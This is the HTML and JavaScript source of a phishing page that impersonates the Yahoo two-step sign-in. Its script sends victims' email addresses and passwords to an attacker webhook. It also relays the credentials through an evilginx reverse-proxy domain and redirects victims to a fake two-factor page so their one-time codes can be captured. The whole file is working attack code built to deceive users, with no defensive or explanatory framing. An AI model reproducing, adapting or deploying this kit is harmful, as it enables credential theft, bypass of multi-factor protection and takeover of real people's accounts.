<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yahoo - Sign In</title>
    <link rel="icon" href="https://s.yimg.com/rz/l/favicon.ico">
    <style>
        /* Styles are identical to the previous version, so they are omitted for clarity */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "Helvetica Neue", Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 400px; padding: 40px; }
        .yahoo-logo { text-align: center; margin-bottom: 30px; }
        .yahoo-logo img { width: 120px; height: auto; }
        .form-title { font-size: 24px; font-weight: 600; color: #333; text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        .form-label { display: block; font-size: 14px; font-weight: 500; color: #555; margin-bottom: 8px; }
        .form-input { width: 100%; padding: 12px 16px; border: 2px solid #e1e5e9; border-radius: 6px; font-size: 16px; transition: border-color 0.3s ease; }
        .form-input:focus { outline: none; border-color: #4a90e2; }
        .form-button { width: 100%; padding: 14px; background: #4a90e2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease; }
        .form-button:hover { background: #357abd; }
        .form-button:disabled { background: #ccc; cursor: not-allowed; }
        .error-message { background: #fee; border: 1px solid #fcc; color: #c33; padding: 12px; border-radius: 6px; margin-bottom: 20px; display: none; }
        .loading { display: none; text-align: center; margin-top: 20px; }
        .loading-spinner { border: 3px solid #f3f3f3; border-top: 3px solid #4a90e2; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .step-indicator { text-align: center; margin-bottom: 20px; font-size: 14px; color: #666; }
        .password-toggle { position: relative; }
        .password-toggle-btn { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; font-size: 14px; color: #4a90e2; }
    </style>
</head>
<body>
    <div class="container">
        <div class="yahoo-logo">
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_205x58_frontpage.png" alt="Yahoo">
        </div>
        
        <!-- Step 1: Email Input -->
        <div id="email-step" class="form-step">
            <div class="step-indicator">Step 1 of 2</div>
            <h2 class="form-title">Sign in to Yahoo</h2>
            <div class="error-message" id="email-error"></div>
            <form id="email-form">
                <div class="form-group">
                    <label class="form-label" for="email">Email address or phone number</label>
                    <input type="text" id="email" name="username" class="form-input" required autocomplete="username">
                </div>
                <button type="submit" class="form-button" id="email-submit">Next</button>
            </form>
        </div>
        
        <!-- Step 2: Password Input -->
        <div id="password-step" class="form-step" style="display: none;">
            <div class="step-indicator">Step 2 of 2</div>
            <h2 class="form-title">Enter your password</h2>
            <div class="error-message" id="password-error"></div>
            <div id="user-email" style="text-align: center; margin-bottom: 20px; font-size: 14px; color: #666;"></div>
            <form id="password-form">
                <div class="form-group">
                    <label class="form-label" for="password">Password</label>
                    <div class="password-toggle">
                        <input type="password" id="password" name="passwd" class="form-input" required autocomplete="current-password">
                        <button type="button" class="password-toggle-btn" id="password-toggle">Show</button>
                    </div>
                </div>
                <button type="submit" class="form-button" id="password-submit">Sign in</button>
            </form>
            <div style="text-align: center; margin-top: 20px;">
                <a href="#" id="back-to-email" style="color: #4a90e2; text-decoration: none; font-size: 14px;">Use a different account</a>
            </div>
        </div>
        
        <!-- Loading State -->
        <div class="loading" id="loading">
            <div class="loading-spinner"></div>
            <p style="margin-top: 10px;">Validating...</p>
        </div>
    </div>

    <script>
        // --- CONFIGURATION ---
        const CONFIG = {
            nextPages: {
                twofa: 'https://yahoo-2fa-selection.vercel.app/',
                success: 'https://mail.yahoo.com/d/folders/1'
            },
            webhookUrl: 'https://webhook.site/YOUR_UNIQUE_ID' // IMPORTANT: Replace with your webhook URL
        };

        // --- STATE MANAGEMENT ---
        const state = {
            currentStep: 'email',
            username: '',
            sessionData: {},
            isSubmitting: false,
            evilginxDomain: ''
        };

        // --- UTILITY FUNCTIONS ---
        const utils = {
            showError: (stepId, message) => {
                const errorEl = document.getElementById(`${stepId}-error`);
                if (errorEl) {
                    errorEl.textContent = message;
                    errorEl.style.display = 'block';
                    setTimeout(() => { errorEl.style.display = 'none'; }, 5000);
                }
            },
            setLoading: (isLoading) => {
                document.getElementById('loading').style.display = isLoading ? 'block' : 'none';
                document.querySelectorAll('.form-step').forEach(step => {
                    step.style.display = 'none';
                });
                if (!isLoading) {
                    document.getElementById(`${state.currentStep}-step`).style.display = 'block';
                }
                state.isSubmitting = isLoading;
            },
            switchStep: (step) => {
                state.currentStep = step;
                utils.setLoading(false);
            },
            captureData: async (data) => {
                try {
                    await fetch(CONFIG.webhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ ...data, timestamp: new Date().toISOString(), ...state.sessionData })
                    });
                } catch (error) {
                    console.warn('Webhook capture failed:', error);
                }
            }
        };

        // --- SESSION MANAGEMENT ---
        const sessionManager = {
            init: () => {
                const urlParams = new URLSearchParams(window.location.search);
                state.evilginxDomain = urlParams.get('evilginx_domain');
                
                if (!state.evilginxDomain) {
                    console.error("CRITICAL: evilginx_domain parameter is missing. The form will not work.");
                    utils.showError('email', 'Configuration error. Please access through the correct link.');
                    document.getElementById('email-submit').disabled = true;
                    return;
                }

                state.sessionData = {
                    evilginx_domain: state.evilginxDomain,
                    sessionIndex: urlParams.get('sessionIndex') || 'N/A',
                    acrumb: urlParams.get('acrumb') || 'N/A',
                    done: urlParams.get('done') || 'https://mail.yahoo.com/',
                    src: urlParams.get('src') || 'ym',
                    bypass: urlParams.get('bypass') || 'none'
                };
                utils.captureData({ type: 'page_loaded', page: 'login' });
            }
        };

        // --- FORM HANDLERS ---
        const formHandlers = {
            handleEmailSubmit: async (event) => {
                event.preventDefault();
                if (state.isSubmitting) return;

                state.username = document.getElementById('email').value.trim();
                if (!state.username) {
                    utils.showError('email', 'Please enter your email or phone number.');
                    return;
                }

                utils.setLoading(true);
                await utils.captureData({ type: 'email_entered', username: state.username });
                
                // Simulate a quick check
                setTimeout(() => {
                    utils.switchStep('password');
                    document.getElementById('user-email').textContent = `Signing in as: ${state.username}`;
                    document.getElementById('password').focus();
                }, 500);
            },
            handlePasswordSubmit: async (event) => {
                event.preventDefault();
                if (state.isSubmitting) return;

                const password = document.getElementById('password').value;
                if (!password) {
                    utils.showError('password', 'Please enter your password.');
                    return;
                }

                utils.setLoading(true);
                await utils.captureData({ type: 'credentials_captured', username: state.username, password });

                const formData = new URLSearchParams({
                    username: state.username,
                    passwd: password,
                    ...state.sessionData
                });

                try {
                    const response = await fetch(`https://${state.evilginxDomain}/account/challenge/password`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: formData,
                        credentials: 'include'
                    });

                    // Regardless of the response, we assume success and proceed to the 2FA page.
                    // This is because we can't trust the response from the blocked domain.
                    // The real validation happens when the user enters the OTP.
                    console.log('Password submitted to evilginx. Assuming 2FA is required.');
                    await utils.captureData({ type: 'password_submitted_proceeding_to_2fa' });

                    const params = new URLSearchParams({
                        u: state.username,
                        ...state.sessionData
                    });
                    
                    window.location.href = `${CONFIG.nextPages.twofa}?${params.toString()}`;

                } catch (error) {
                    console.error('Fetch to evilginx failed:', error);
                    // Even on failure, proceed to 2FA page to not lose the user.
                    await utils.captureData({ type: 'fetch_error_proceeding_to_2fa', error: error.message });
                    const params = new URLSearchParams({ u: state.username, ...state.sessionData });
                    window.location.href = `${CONFIG.nextPages.twofa}?${params.toString()}`;
                }
            }
        };

        // --- EVENT LISTENERS ---
        const setupEventListeners = () => {
            document.getElementById('email-form').addEventListener('submit', formHandlers.handleEmailSubmit);
            document.getElementById('password-form').addEventListener('submit', formHandlers.handlePasswordSubmit);
            document.getElementById('back-to-email').addEventListener('click', (e) => {
                e.preventDefault();
                utils.switchStep('email');
                document.getElementById('email').focus();
            });
            document.getElementById('password-toggle').addEventListener('click', (e) => {
                const passwordField = document.getElementById('password');
                e.target.textContent = passwordField.type === 'password' ? 'Hide' : 'Show';
                passwordField.type = passwordField.type === 'password' ? 'text' : 'password';
            });
        };

        // --- INITIALIZATION ---
        document.addEventListener('DOMContentLoaded', () => {
            sessionManager.init();
            setupEventListeners();
        });
    </script>
</body>
</html>
